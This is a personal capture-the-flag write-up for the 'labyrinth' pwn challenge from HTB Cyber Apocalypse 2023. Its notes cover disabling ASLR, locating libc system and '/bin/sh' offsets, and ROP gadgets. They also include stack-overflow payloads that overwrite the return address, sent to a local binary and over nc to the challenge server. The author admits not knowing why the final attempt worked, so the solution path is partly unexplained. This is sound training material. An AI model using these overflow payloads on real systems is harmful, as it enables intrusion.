# labyrinth

**SOLVED** - Note: I think I got this by accident (review this: https://github.com/Mymaqn/HTBCA2023_Pwn_Writeups/tree/master/labyrinth)

> You find yourself trapped in a mysterious labyrinth, with only one chance to escape. 
> Choose the correct door wisely, for the wrong choice could have deadly consequences.

```sh
strings labrynth

/opt/ghidra_10.1.5_PUBLIC/ghidraRun &
```

https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/ret2libc

```sh
# disable ASLR
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# find libc and base
ldd labrynth

# linux-vdso.so.1 (0x00007ffff7fc1000)
#         libc.so.6 => ./glibc/libc.so.6 (0x00007ffff7c00000)
#         ./glibc/ld-linux-x86-64.so.2 => /lib64/ld-linux-x86-64.so.2 (0x00007ffff7fc3000)

# find libc system
readelf -s ./glibc/libc.so.6 | grep system
# -s symbols

# 1481: 0000000000050d60    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5

# find /bin/sh
strings -a -t x ./glibc/libc.so.6 | grep /bin/sh
# -a entire file, -t x outputs offset in hex

# 1d8698 /bin/sh

ROPgadget --binary labyrinth | grep rdi
# 0x000000000040166b : pop rdi ; ret
```

need to get here -> 0x004012c1  (escape_plan)

```sh
r <<< $(echo "069"; python3 -c "import sys; sys.stdout.buffer.write(b'A'*48 + b'\xd8\xe3\xff\xff\xff\x7f\x00\x00' + b'\xb0\x12\x40\x00\x00\x00\x00\x00')") 
```

```sh
# re-enable ASLR
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space

# disable again
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

 (echo "069"; python3 -c "import sys; sys.stdout.buffer.write(b'A'*48 + b'\xd8\xe3\xff\xff\xff\x7f\x00\x00' + b'\xb0\x12\x40\x00\x00\x00\x00\x00')") | ./labyrinth 
```

```sh
(echo "069"; python3 -c "import sys; sys.stdout.buffer.write(b'A'*48 + b'\xd8\xe3\xff\xff\xff\x7f\x00\x00' + b'\xb0\x12\x40\x00\x00\x00\x00\x00')") | nc 161.35.168.118 32643
```

must not be working remotely because of ASLR

```sh
pwndbg> checksec
# [*] '/home/barrett/repos/ctf/cyber-apocalypse-2023/pwn/labryinth/labyrinth'
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    No canary found
#     NX:       NX enabled
#     PIE:      No PIE (0x400000)
#     RUNPATH:  b'./glibc/'

# https://ir0nstone.gitbook.io/notes/types/stack/relro
# relro moves the libc GOT pointers we need, every application start, to a different address.

# https://stacklikemind.io/ret2libc-aslr

readelf --relocs labyrinth
# 000000403f78  000300000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0

readelf labyrinth
# entry 0x401140

ROPgadget --binary labyrinth | grep rdi
# 0x000000000040166b : pop rdi ; ret

# gdb
# pattern create 200
```

https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass
https://infosecwriteups.com/ret2libc-attack-in-lin-3dfc827c90c3

Door: AAAA/bin/sh

```c
fgets((char *)&local_38,0x44,stdin);
// 68 bytes
```

```sh
(echo "069"; \
python3 -c "import sys; sys.stdout.buffer.write(b'A'*55)") \
| ./labyrinth 
```

honestly not sure why this worked - `python3 flag.py`

`HTB{3sc4p3_fr0m_4b0v3}`
